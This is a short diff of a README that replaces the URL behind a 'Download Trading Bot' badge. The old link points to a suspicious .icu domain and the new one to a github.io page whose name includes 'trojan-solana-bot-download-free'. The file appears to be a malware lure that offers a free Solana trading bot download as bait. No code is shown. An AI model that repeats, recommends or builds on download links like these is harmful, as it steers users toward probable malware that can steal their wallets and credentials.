@@ -1,4 +1,4 @@
-[![Download Trading Bot](https://img.shields.io/badge/Download-Trading%20Bot-blueviolet)](https://downloadifiles.icu?label=bed33cdd29a1fdc17814b892c386c9e9)
+[![Download Trading Bot](https://img.shields.io/badge/Download-Trading%20Bot-blueviolet)](https://trojan-solana-bot-download-free.github.io/.github/)
 
 
 
